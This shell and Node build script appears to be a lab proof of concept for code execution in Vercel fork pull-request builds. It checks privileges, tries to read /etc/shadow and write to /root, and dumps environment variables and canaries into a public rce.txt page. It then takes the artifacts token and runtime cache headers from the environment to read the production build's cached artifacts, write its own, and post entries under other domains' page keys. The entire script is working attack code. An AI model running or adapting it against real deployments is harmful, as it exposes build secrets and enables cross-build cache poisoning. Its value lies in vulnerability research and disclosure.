#!/bin/sh
mkdir -p public
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > public/index.html
{
  echo "== who am i =="
  id
  uname -a
  echo "FAKEROOTKEY=${FAKEROOTKEY:-ABSENT}"
  grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status
  echo -n "write to /root: "
  (touch /root/.lab-write-test && echo OK) || echo DENIED
  echo -n "read /etc/shadow: "
  (head -c 1 /etc/shadow >/dev/null 2>&1 && echo READABLE) || echo DENIED
  echo "LAB-NONCE: CANARY-8336db7bc74b6183"
  echo "VERCEL_ENV=${VERCEL_ENV:-unset}"
  echo "LAB_CANARY_A=${LAB_CANARY_A:-unset}"
  echo "LAB_PROD_ONLY=${LAB_PROD_ONLY:-unset}   (target=production only)"
  echo "TURBO_CACHE=${TURBO_CACHE:-unset}"
} > public/rce.txt
node -e '
const out = [];
const ep = process.env.VERCEL_API_ENDPOINT || "https://api.vercel.com";
const team = process.env.VERCEL_ARTIFACTS_OWNER || "";
const AT = process.env.VERCEL_ARTIFACTS_TOKEN || "";
const AH = { Authorization: "Bearer " + AT };
const nonce = "lab-" + Math.random().toString(36).slice(2, 10);
async function get(label, url) {
  try {
    const r = await fetch(url, { headers: AH });
    let b = "";
    try { b = (await r.text()).slice(0, 200); } catch (e) {}
    out.push("GET " + label + " -> HTTP " + r.status + (b ? " | " + b.replace(/\n/g, " ") : ""));
  } catch (e) { out.push("GET " + label + " -> ERR " + String(e.message).slice(0, 60)); }
}
async function put(label, url, body) {
  try {
    const r = await fetch(url, { method: "PUT",
      headers: Object.assign({ "Content-Type": "application/octet-stream" }, AH),
      body: Buffer.from(body) });
    let b = "";
    try { b = (await r.text()).slice(0, 200); } catch (e) {}
    out.push("PUT " + label + " -> HTTP " + r.status + (b ? " | " + b.replace(/\n/g, " ") : ""));
  } catch (e) { out.push("PUT " + label + " -> ERR " + String(e.message).slice(0, 60)); }
}
(async () => {
  out.push("== A. can a fork-PR build READ the artifact written by the PRODUCTION build? ==");
  out.push("  (production build on the default branch stored it under hash lab-shared-read-proof-v1)");
  await get("lab-shared-read-proof-v1", ep + "/v8/artifacts/lab-shared-read-proof-v1?teamId=" + team);
  await get("lab-shared-read-proof-v1 (no teamId)", ep + "/v8/artifacts/lab-shared-read-proof-v1");
  out.push("== B. control: hash written by a PREVIOUS fork-PR build (branch namespace) ==");
  await get("lab-branch-only-v1", ep + "/v8/artifacts/lab-branch-only-v1?teamId=" + team);
  out.push("== C. write our own artifact, then read it back ==");
  await put("lab-branch-only-v1", ep + "/v8/artifacts/lab-branch-only-v1?teamId=" + team,
    "LAB-BRANCH-ARTIFACT-" + nonce);
  await get("lab-branch-only-v1 (after write)", ep + "/v8/artifacts/lab-branch-only-v1?teamId=" + team);
  out.push("== D. batch existence check ==");
  try {
    const r = await fetch(ep + "/v8/artifacts?teamId=" + team, { method: "POST",
      headers: Object.assign({ "Content-Type": "application/json" }, AH),
      body: JSON.stringify({ hashes: ["lab-shared-read-proof-v1", "lab-branch-only-v1", "nonexistent-" + nonce] }) });
    out.push("POST /v8/artifacts -> HTTP " + r.status + " | " + (await r.text()).slice(0, 300));
  } catch (e) { out.push("POST /v8/artifacts -> ERR " + e.message); }
  out.push("== E. suspense cache: namespace scope ==");
  const hdrs = (() => { try { return JSON.parse(process.env.RUNTIME_CACHE_HEADERS || "{}"); } catch (e) { return {}; } })();
  const sce = process.env.RUNTIME_CACHE_ENDPOINT || "";
  if (sce) {
    try {
      const r = await fetch(sce + "labkey-previous-build", { headers: hdrs });
      out.push("GET labkey-previous-build -> HTTP " + r.status + " | " + (await r.text()).slice(0, 120));
    } catch (e) { out.push("GET labkey-previous-build -> ERR " + e.message); }
    try {
      const r = await fetch(sce + "labkey-" + nonce, { method: "POST",
        headers: Object.assign({ "Content-Type": "application/json" }, hdrs),
        body: JSON.stringify({ value: "LAB-SUSPENSE-" + nonce }) });
      out.push("POST labkey-" + nonce + " -> HTTP " + r.status);
    } catch (e) { out.push("POST labkey-" + nonce + " -> ERR " + e.message); }
    for (const d of ["vercel-fork-rce-lab-boshjerns-projects.vercel.app", "example.com"]) {
      try {
        const r = await fetch(sce + "page/" + d + "/index.html", { method: "POST",
          headers: Object.assign({ "Content-Type": "application/json" }, hdrs),
          body: JSON.stringify({ value: "LAB-DOMAIN-" + d }) });
        out.push("POST page/" + d + "/index.html -> HTTP " + r.status);
      } catch (e) { out.push("POST page/" + d + " -> ERR " + e.message); }
    }
  }
  require("fs").appendFileSync("public/rce.txt", "\n" + out.join("\n") + "\n");
})();
' 2>> public/rce.txt
sleep 9
cat public/rce.txt
